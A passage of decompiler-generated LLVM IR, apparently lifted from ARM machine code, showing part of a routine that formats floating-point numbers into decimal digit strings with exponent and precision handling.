  %v0_2cb28 = phi i32 [ %v0_2cb28.pre, %dec_label_pc_2caf4..thread9_crit_edge ], [ %v2_2cb10, %bb209 ]
  %v0_2cb24 = load i32, i32* %r5.global-to-local, align 4
  %v1_2cb24 = sext i32 %v0_2cb24 to i64
  %v2_2cb24 = bitcast i64 %v1_2cb24 to double
  %v9_2cb2c = fmul double %v2_2cb24, 0.000000e+00
  %v10_2cb2c = fptrunc double %v9_2cb2c to float
  %v11_2cb2c = bitcast float %v10_2cb2c to i32
  store i32 %v11_2cb2c, i32* @r2, align 4
  store i32 %v0_2cb28, i32* %r3.global-to-local, align 4
  store i32 %v0_2cb24, i32* @r0, align 4
  store i32 %v0_2cb28, i32* %r1.global-to-local, align 4
  %v7_2cb40 = call i32 @__aeabi_dcmpeq(i32 %v0_2cb24, i32 %v0_2cb28, i32 %v11_2cb2c, i32 %v0_2cb28, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_2cb40, i32* %r0.global-to-local, align 4
  %v2_2cb44 = icmp eq i32 %v7_2cb40, 0
  store i1 %v2_2cb44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cb44, label %dec_label_pc_2cb98, label %.thread9.dec_label_pc_2cb4c_crit_edge

.thread9.dec_label_pc_2cb4c_crit_edge:            ; preds = %.thread9
  %v3_2cb4c.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_2cb4c

dec_label_pc_2cb4c:                               ; preds = %bb207, %.thread9.dec_label_pc_2cb4c_crit_edge
  %v3_2cb4c = phi i32 [ %v3_2cb4c.pre, %.thread9.dec_label_pc_2cb4c_crit_edge ], [ %arg4, %bb207 ]
  %v1_2ca90.v0_2ca7c5 = phi i32 [ 0, %.thread9.dec_label_pc_2cb4c_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_2cb4c, i32* %ip.global-to-local, align 4
  %v2_2cb54 = add i32 %v3_2cb4c, 16
  %v3_2cb54 = inttoptr i32 %v2_2cb54 to i32*
  store i32 32, i32* %v3_2cb54, align 4
  %v0_2cb5c = load i32, i32* %sb.global-to-local, align 4
  %v7_2cb5c = icmp eq i32 %v0_2cb5c, 96
  store i1 %v7_2cb5c, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_2cb5c, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_2cb4c
  %v5_2cb70 = or i32 %v1_2ca90.v0_2ca7c5, 4
  store i32 %v5_2cb70, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_2cb4c, %bb210
  %v4_2cb74 = phi i32 [ %v5_2cb70, %bb210 ], [ 3, %dec_label_pc_2cb4c ]
  %v4_2cb74.v1_2ca90.v0_2ca7c = select i1 %tmp274, i32 %v4_2cb74, i32 %v1_2ca90.v0_2ca7c5
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34544), i32* %r3.global-to-local, align 4
  %v2_2cb88 = add i32 %v4_2cb74.v1_2ca90.v0_2ca7c, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34544)
  store i32 %v2_2cb88, i32* %r2.global-to-local, align 4
  %v2_2cb8c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_2cb8c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2d0b4

dec_label_pc_2cb98:                               ; preds = %.thread9
  %v0_2cb98 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2cb98, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_2cba0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2cba0, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_2cba8 = call i32 @__aeabi_dcmplt(i32 %v0_2cba0, i32 %v0_2cb98, i32 0, i32 1100470148)
  store i32 %v6_2cba8, i32* %r0.global-to-local, align 4
  %v2_2cbac = icmp eq i32 %v6_2cba8, 0
  store i1 %v2_2cbac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cbac, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_2cb98
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_2cb98, %bb211
  %v0_2cbb4 = phi i32 [ 0, %dec_label_pc_2cb98 ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34520), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34520), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_2cbe8 = icmp eq i32 %v0_2cbb4, 0
  br label %dec_label_pc_2cbd8

dec_label_pc_2cbd8:                               ; preds = %dec_label_pc_2cc70.dec_label_pc_2cbd8_crit_edge, %bb212
  %v2_2cbe0 = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34520), %bb212 ], [ %v2_2cbe0.pre, %dec_label_pc_2cc70.dec_label_pc_2cbd8_crit_edge ]
  %v0_2cbdc = phi i32 [ 9, %bb212 ], [ %v0_2cc70, %dec_label_pc_2cc70.dec_label_pc_2cbd8_crit_edge ]
  %v2_2cc20 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_2cc70.dec_label_pc_2cbd8_crit_edge ]
  store i32 %v0_2cbb4, i32* %r2.global-to-local, align 4
  %v1_2cbdc = add i32 %v0_2cbdc, -1
  store i32 %v1_2cbdc, i32* %sl.global-to-local, align 4
  store i32 %v2_2cbe0, i32* @lr, align 4
  %v3_2cbe4 = mul i32 %v1_2cbdc, 8
  store i32 %v3_2cbe4, i32* %r3.global-to-local, align 4
  store i1 %v2_2cbe8, i1* %cpsr_z.global-to-local, align 1
  %v0_2cbec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2cbec, i32* %r0.global-to-local, align 4
  %v0_2cbf0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2cbf0, i32* %r1.global-to-local, align 4
  %v2_2cbf4 = add i32 %v3_2cbe4, %v2_2cbe0
  store i32 %v2_2cbf4, i32* %ip.global-to-local, align 4
  %v1_2cc30 = inttoptr i32 %v2_2cbf4 to i32*
  %v2_2cc30 = load i32, i32* %v1_2cc30, align 4
  %v3_2cc30 = sext i32 %v2_2cc30 to i64
  %v1_2cc34 = sext i32 %v0_2cbec to i64
  %v2_2cc34 = bitcast i64 %v1_2cc34 to double
  br i1 %v2_2cbe8, label %dec_label_pc_2cc30, label %dec_label_pc_2cbfc

dec_label_pc_2cbfc:                               ; preds = %dec_label_pc_2cbd8
  %v8_2cc00 = bitcast i64 %v3_2cc30 to double
  %v9_2cc00 = fmul double %v2_2cc34, %v8_2cc00
  %v10_2cc00 = fptrunc double %v9_2cc00 to float
  %v11_2cc00 = bitcast float %v10_2cc00 to i32
  store i32 %v11_2cc00, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_2cc00, i32* %r7.global-to-local, align 4
  store i32 %v0_2cbf0, i32* %r8.global-to-local, align 4
  %v4_2cc14 = call i32 @__aeabi_dcmplt(i32 %v11_2cc00, i32 %v0_2cbf0, i32 0, i32 1104006501)
  store i32 %v4_2cc14, i32* %r0.global-to-local, align 4
  %v2_2cc18 = icmp eq i32 %v4_2cc14, 0
  store i1 %v2_2cc18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cc18, label %dec_label_pc_2cc70, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_2cbfc
  %v1_2cc20 = load i32, i32* %r4.global-to-local, align 4
  %v3_2cc20 = sub i32 %v2_2cc20, %v1_2cc20
  store i32 %v3_2cc20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2cc68

dec_label_pc_2cc30:                               ; preds = %dec_label_pc_2cbd8
  store i32 %v0_2cbf0, i32* @r1, align 4
  %v8_2cc3c = bitcast i64 %v3_2cc30 to double
  %v9_2cc3c = fdiv double %v2_2cc34, %v8_2cc3c
  %v10_2cc3c = fptrunc double %v9_2cc3c to float
  %v11_2cc3c = bitcast float %v10_2cc3c to i32
  store i32 %v11_2cc3c, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_2cc3c, i32* %r7.global-to-local, align 4
  store i32 %v0_2cbf0, i32* %r8.global-to-local, align 4
  %v4_2cc50 = call i32 @__aeabi_dcmpge(i32 %v11_2cc3c, i32 %v0_2cbf0, i32 0, i32 1100470148)
  store i32 %v4_2cc50, i32* %r0.global-to-local, align 4
  %v2_2cc54 = icmp eq i32 %v4_2cc50, 0
  store i1 %v2_2cc54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cc54, label %dec_label_pc_2cc70, label %dec_label_pc_2cc5c

dec_label_pc_2cc5c:                               ; preds = %dec_label_pc_2cc30
  %v1_2cc60 = load i32, i32* %r4.global-to-local, align 4
  %v2_2cc60 = add i32 %v1_2cc60, %v2_2cc20
  store i32 %v2_2cc60, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2cc68

dec_label_pc_2cc68:                               ; preds = %.thread10, %dec_label_pc_2cc5c
  %stack_var_-192.2 = phi i32 [ %v2_2cc60, %dec_label_pc_2cc5c ], [ %v3_2cc20, %.thread10 ]
  %v0_2cc68 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_2cc68, i32* %r5.global-to-local, align 4
  %v0_2cc6c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_2cc6c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2cc70

dec_label_pc_2cc70:                               ; preds = %dec_label_pc_2cbfc, %dec_label_pc_2cc30, %dec_label_pc_2cc68
  %stack_var_-192.3 = phi i32 [ %v2_2cc20, %dec_label_pc_2cc30 ], [ %stack_var_-192.2, %dec_label_pc_2cc68 ], [ %v2_2cc20, %dec_label_pc_2cbfc ]
  %v0_2cc70 = load i32, i32* %sl.global-to-local, align 4
  %v2_2cc70 = icmp eq i32 %v0_2cc70, 0
  store i1 %v2_2cc70, i1* %cpsr_z.global-to-local, align 1
  %v0_2cc74 = load i32, i32* %r4.global-to-local, align 4
  %v3_2cc74 = sdiv i32 %v0_2cc74, 2
  store i32 %v3_2cc74, i32* %r4.global-to-local, align 4
  br i1 %v2_2cc70, label %dec_label_pc_2cc7c, label %dec_label_pc_2cc70.dec_label_pc_2cbd8_crit_edge

dec_label_pc_2cc70.dec_label_pc_2cbd8_crit_edge:  ; preds = %dec_label_pc_2cc70
  %v2_2cbe0.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_2cbd8

dec_label_pc_2cc7c:                               ; preds = %dec_label_pc_2cc70
  %v0_2cc7c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2cc7c, i32* @r0, align 4
  %v0_2cc80 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2cc80, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_2cc8c = call i32 @__aeabi_dcmpge(i32 %v0_2cc7c, i32 %v0_2cc80, i32 0, i32 1104006501)
  store i32 %v6_2cc8c, i32* %r0.global-to-local, align 4
  %v2_2cc90 = icmp eq i32 %v6_2cc8c, 0
  store i1 %v2_2cc90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cc90, label %dec_label_pc_2ccc0, label %dec_label_pc_2cc98

dec_label_pc_2cc98:                               ; preds = %dec_label_pc_2cc7c
  %v0_2cc98 = load i32, i32* %r5.global-to-local, align 4
  %v1_2cc98 = sext i32 %v0_2cc98 to i64
  %v2_2cc98 = bitcast i64 %v1_2cc98 to double
  %v0_2cc9c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2cc9c, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_2cca8 = fdiv double %v2_2cc98, 0.000000e+00
  %v10_2cca8 = fptrunc double %v9_2cca8 to float
  %v11_2cca8 = bitcast float %v10_2cca8 to i32
  store i32 %v11_2cca8, i32* %r0.global-to-local, align 4
  store i32 %v11_2cca8, i32* %r5.global-to-local, align 4
  %v1_2ccb8 = add i32 %stack_var_-192.3, 1
  store i32 %v1_2ccb8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2ccc0

dec_label_pc_2ccc0:                               ; preds = %dec_label_pc_2cc98, %bb208, %dec_label_pc_2cc7c, %dec_label_pc_2cae0
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_2cc7c ], [ -1, %dec_label_pc_2cae0 ], [ -1, %bb208 ], [ %v1_2ccb8, %dec_label_pc_2cc98 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_2ccc4 = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_2ccc4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_2ccc8

dec_label_pc_2ccc8:                               ; preds = %dec_label_pc_2cd40, %dec_label_pc_2ccc0
  %v0_2ccc8 = load i32, i32* %r6.global-to-local, align 4
  %v0_2cccc = load i32, i32* %r5.global-to-local, align 4
  %v1_2ccd0 = sext i32 %v0_2cccc to i64
  %v2_2ccd0 = bitcast i64 %v1_2ccd0 to double
  %v3_2ccd0 = fptoui double %v2_2ccd0 to i32
  store i32 %v3_2ccd0, i32* %r8.global-to-local, align 4
  store i32 %v3_2ccd0, i32* %r2.global-to-local, align 4
  store i32 %v0_2ccc8, i32* %r3.global-to-local, align 4
  store i32 %v0_2cccc, i32* @r0, align 4
  store i32 %v0_2ccc8, i32* %r1.global-to-local, align 4
  %v6_2ccec = call i32 @__aeabi_dsub(i32 %v0_2cccc, i32 %v0_2ccc8, i32 %v3_2ccd0, i32 %v0_2ccc8)
  %v7_2ccec = sext i32 %v6_2ccec to i64
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v3_2ccf8 = bitcast i64 %v7_2ccec to double
  %v9_2ccf8 = fmul double %v3_2ccf8, 0.000000e+00
  %v10_2ccf8 = fptrunc double %v9_2ccf8 to float
  %v11_2ccf8 = bitcast float %v10_2ccf8 to i32
  store i32 %v11_2ccf8, i32* %r0.global-to-local, align 4
  %v0_2ccfc = load i32, i32* %sl.global-to-local, align 4
  %v1_2ccfc = add i32 %v0_2ccfc, 9
  store i32 %v1_2ccfc, i32* %sl.global-to-local, align 4
  store i32 %v11_2ccf8, i32* %r5.global-to-local, align 4
  store i32 %v0_2ccc8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_2cd0c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2cd0c

dec_label_pc_2cd0c:                               ; preds = %dec_label_pc_2cd0c.dec_label_pc_2cd0c_crit_edge, %dec_label_pc_2ccc8
  %v1_2cd20 = phi i32 [ %v1_2cd20.pre, %dec_label_pc_2cd0c.dec_label_pc_2cd0c_crit_edge ], [ %v1_2ccfc, %dec_label_pc_2ccc8 ]
  %v0_2cd18 = phi i32 [ %v0_2cd34, %dec_label_pc_2cd0c.dec_label_pc_2cd0c_crit_edge ], [ 0, %dec_label_pc_2ccc8 ]
  %v0_2cd24 = phi i32 [ %v2_2cd30, %dec_label_pc_2cd0c.dec_label_pc_2cd0c_crit_edge ], [ %v0_2cd0c.pre, %dec_label_pc_2ccc8 ]
  %v3_2cd14 = urem i32 %v0_2cd24, 10
  %v1_2cd18 = add i32 %v0_2cd18, 1
  store i32 %v1_2cd18, i32* %r7.global-to-local, align 4
  %v1_2cd1c = or i32 %v3_2cd14, 48
  store i32 %v1_2cd1c, i32* %r2.global-to-local, align 4
  %v2_2cd20 = sub i32 %v1_2cd20, %v1_2cd18
  store i32 %v2_2cd20, i32* %r3.global-to-local, align 4
  store i32 %v0_2cd24, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_2cd2c = trunc i32 %v1_2cd1c to i8
  %v3_2cd2c = inttoptr i32 %v2_2cd20 to i8*
  store i8 %v1_2cd2c, i8* %v3_2cd2c, align 1
  %v0_2cd30 = load i32, i32* %r0.global-to-local, align 4
  %v1_2cd30 = load i32, i32* %r1.global-to-local, align 4
  %v2_2cd30 = udiv i32 %v0_2cd30, %v1_2cd30
  store i32 %v2_2cd30, i32* %r0.global-to-local, align 4
  %v0_2cd34 = load i32, i32* %r7.global-to-local, align 4
  %v7_2cd34 = icmp eq i32 %v0_2cd34, 8
  store i1 %v7_2cd34, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_2cd30, i32* %r8.global-to-local, align 4
  %v7_2cd3c = icmp slt i32 %v0_2cd34, 9
  br i1 %v7_2cd3c, label %dec_label_pc_2cd0c.dec_label_pc_2cd0c_crit_edge, label %dec_label_pc_2cd40

dec_label_pc_2cd0c.dec_label_pc_2cd0c_crit_edge:  ; preds = %dec_label_pc_2cd0c
  %v1_2cd20.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_2cd0c

dec_label_pc_2cd40:                               ; preds = %dec_label_pc_2cd0c
  %v0_2cd40 = load i32, i32* %r4.global-to-local, align 4
  %v1_2cd40 = add i32 %v0_2cd40, 1
  store i32 %v1_2cd40, i32* %r4.global-to-local, align 4
  %v7_2cd44 = icmp eq i32 %v0_2cd40, 0
  store i1 %v7_2cd44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2cd44, label %dec_label_pc_2ccc8, label %dec_label_pc_2cd4c

dec_label_pc_2cd4c:                               ; preds = %dec_label_pc_2cd40
  %v0_2cd4c = load i32, i32* %sb.global-to-local, align 4
  %v7_2cd4c = icmp eq i32 %v0_2cd4c, 96
  store i1 %v7_2cd4c, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_2cd4c, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_2cd4c
  %v5_2cd5c = add i32 %v0_2cd4c, 32
  store i32 %v5_2cd5c, i32* %r3.global-to-local, align 4
  %v5_2cd60 = urem i32 %v5_2cd5c, 256
  store i32 %v5_2cd60, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_2cd4c
  %v4_2cd58.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_2cd58.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_2cd58126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_2cd80 = phi i32 [ %v0_2cd4c, %thread-pre-split ], [ %v5_2cd60, %bb213 ]
  %v7_2cd64 = icmp eq i32 %v0_2cd80, 103
  %. = zext i1 %v7_2cd64 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_2cd70 = load i32, i32* %fp.global-to-local, align 4
  %v2_2cd70 = icmp eq i32 %v0_2cd70, 0
  store i1 %v2_2cd70, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_2cd70, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_2cd78 = icmp eq i1 %v7_2cd64, false
  store i1 %v2_2cd78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cd78, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_2cd7c = add i32 %v0_2cd70, -1
  store i32 %v2_2cd7c, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_2cd90 = phi i32 [ %v0_2cd70, %.thread16 ], [ %v0_2cd70, %bb218 ], [ %v2_2cd7c, %bb219 ]
  %v7_2cd80 = icmp eq i32 %v0_2cd80, 102
  store i1 %v7_2cd80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2cd80, label %dec_label_pc_2cd8c, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_2cd90, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_2cdb4

dec_label_pc_2cd8c:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_2cd90 = add i32 %v0_2cd90, %stack_var_-192.4
  store i32 %v2_2cd90, i32* %ip.global-to-local, align 4
  %v8_2cd94 = icmp eq i32 %v2_2cd90, -1
  store i1 %v8_2cd94, i1* %cpsr_z.global-to-local, align 1
  %v6_2cd98 = icmp slt i32 %v2_2cd90, -1
  br i1 %v6_2cd98, label %dec_label_pc_2cd9c, label %dec_label_pc_2cdb4

dec_label_pc_2cd9c:                               ; preds = %dec_label_pc_2cd8c
  %v2_2cd9c = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_2cd9c, i32* @r0, align 4
  store i32 48, i32* @r1, align 4
  store i32 17, i32* @r2, align 4
  %v0_2cda8 = call i32 @__GI_memset()
  store i32 %v0_2cda8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_2cdb4

dec_label_pc_2cdb4:                               ; preds = %bb221, %dec_label_pc_2cd8c, %dec_label_pc_2cd9c
  %v1_2cdf892 = phi i32 [ %v0_2cda8, %dec_label_pc_2cd9c ], [ %v2_2cd30, %dec_label_pc_2cd8c ], [ %v2_2cd30, %bb221 ]
  %v1_2cddc = phi i32 [ -1, %dec_label_pc_2cd9c ], [ %v2_2cd90, %dec_label_pc_2cd8c ], [ %v0_2cd90, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_2cd9c ], [ %stack_var_-192.4, %dec_label_pc_2cd8c ], [ %stack_var_-192.4, %bb221 ]
  %v1_2cdb8 = add i32 %v1_2cddc, -16
  %v3_2cdb8 = sub i32 15, %v1_2cddc
  %v4_2cdb8 = and i32 %v3_2cdb8, %v1_2cddc
  %v5_2cdb8 = icmp slt i32 %v4_2cdb8, 0
  %v6_2cdb8 = icmp slt i32 %v1_2cdb8, 0
  %v7_2cdb8 = icmp eq i32 %v1_2cddc, 16
  store i1 %v7_2cdb8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_2cdc4 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_2cdc4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_2cdcc = xor i1 %v6_2cdb8, %v5_2cdb8
  %v4_2cdcc = or i1 %v7_2cdb8, %v3_2cdcc
  br i1 %v4_2cdcc, label %dec_label_pc_2cdd8, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_2cdb4
  %v7_2cdcc137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_2cdcc137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_2cdd8:                               ; preds = %dec_label_pc_2cdb4
  %v2_2cdd8 = ptrtoint i32* %stack_var_-82 to i32
  %v2_2cddc = add i32 %v1_2cddc, %v2_2cdd8
  store i32 %v2_2cddc, i32* %r3.global-to-local, align 4
  %v1_2cde0 = add i32 %v2_2cddc, 2
  %v2_2cde0 = inttoptr i32 %v1_2cde0 to i8*
  %v3_2cde0 = load i8, i8* %v2_2cde0, align 1
  %v4_2cde0 = zext i8 %v3_2cde0 to i32
  store i32 %v4_2cde0, i32* %r2.global-to-local, align 4
  store i32 %v1_2cde0, i32* %r1.global-to-local, align 4
  %v2_2cde8 = icmp ugt i8 %v3_2cde0, 51
  %v7_2cde8 = icmp eq i8 %v3_2cde0, 52
  store i1 %v7_2cde8, i1* %cpsr_z.global-to-local, align 1
  %v2_2cdec = xor i1 %v2_2cde8, true
  %v3_2cdec = or i1 %v7_2cde8, %v2_2cdec
  br i1 %v3_2cdec, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_2cdd8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_2cdd8, %bb222
  %v1_2cdf890 = phi i32 [ %v1_2cdf892, %dec_label_pc_2cdd8 ], [ 0, %bb222 ]
  %v2_2cdf0 = xor i1 %v7_2cde8, true
  %v3_2cdf0 = and i1 %v2_2cde8, %v2_2cdf0
  br i1 %v3_2cdf0, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_2cdf4 = phi i32 [ %v0_2cdf4.pre, %._crit_edge87 ], [ %v7_2cdcc137141, %.thread140 ], [ %v1_2cde0, %bb223 ], [ %v1_2cde0, %bb224 ]
  %v1_2cdf8 = phi i32 [ %v1_2cdf8.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_2cdf890, %bb223 ], [ 1, %bb224 ]
  %v1_2cdf4 = add i32 %v0_2cdf4, -1
  %v2_2cdf4 = inttoptr i32 %v1_2cdf4 to i8*
  %v3_2cdf4 = load i8, i8* %v2_2cdf4, align 1
  %v4_2cdf4 = zext i8 %v3_2cdf4 to i32
  store i32 %v1_2cdf4, i32* %r1.global-to-local, align 4
  %v2_2cdf8 = add i32 %v4_2cdf4, %v1_2cdf8
  %v1_2cdfc = urem i32 %v2_2cdf8, 256
  store i32 %v1_2cdfc, i32* %r3.global-to-local, align 4
  %v2_2ce00 = icmp ugt i32 %v1_2cdfc, 56
  %v7_2ce00 = icmp eq i32 %v1_2cdfc, 57
  store i1 %v7_2ce00, i1* %cpsr_z.global-to-local, align 1
  %v2_2ce04 = xor i1 %v2_2ce00, true
  %v3_2ce04 = or i1 %v7_2ce00, %v2_2ce04
  br i1 %v3_2ce04, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_2ce08 = xor i1 %v7_2ce00, true
  %v3_2ce08 = and i1 %v2_2ce00, %v2_2ce08
  br i1 %v3_2ce08, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_2ce10.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_2ce10 = phi i32 [ %v1_2ce10.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_2ce0c = icmp eq i32 %v1_2cdfc, 48
  store i1 %v7_2ce0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2ce0c, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_2ce10 = or i32 %v1_2ce10, 1
  store i32 %v2_2ce10, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_2ce14 = phi i32 [ 1, %bb229 ], [ %v1_2ce10, %bb228 ]
  %v2_2ce14 = icmp eq i32 %v0_2ce14, 0
  store i1 %v2_2ce14, i1* %cpsr_z.global-to-local, align 1
  %v1_2ce18 = trunc i32 %v2_2cdf8 to i8
  store i8 %v1_2ce18, i8* %v2_2cdf4, align 1
  %v0_2ce1c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2ce1c, label %dec_label_pc_2ce20, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_2cdf8.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_2cdf4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_2ce20:                               ; preds = %._crit_edge93
  store i32 %v2_2cdc4, i32* %r2.global-to-local, align 4
  %v2_2ce24 = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_2ce24, i32* %r3.global-to-local, align 4
  %v0_2ce28 = load i32, i32* %r1.global-to-local, align 4
  %v3_2ce28 = icmp uge i32 %v0_2ce28, %v2_2ce24
  %v9_2ce28 = icmp eq i32 %v0_2ce28, %v2_2ce24
  store i1 %v9_2ce28, i1* %cpsr_z.global-to-local, align 1
  %v2_2ce2c = xor i1 %v3_2ce28, true
  %v3_2ce2c = or i1 %v9_2ce28, %v2_2ce2c
  br i1 %v3_2ce2c, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_2ce20
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_2ce24, i32* %r2.global-to-local, align 4
  store i32 %v2_2ce24, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_2ce20, %bb230
  %v2_2ce4c = phi i32 [ %v2_2ce24, %bb230 ], [ %v0_2ce28, %dec_label_pc_2ce20 ]
  %v4_2ce40144 = phi i32 [ %v2_2ce24, %bb230 ], [ %v2_2cdc4, %dec_label_pc_2ce20 ]
  %v2_2ce38 = xor i1 %v9_2ce28, true
  %v3_2ce38 = and i1 %v3_2ce28, %v2_2ce38
  br i1 %v3_2ce38, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
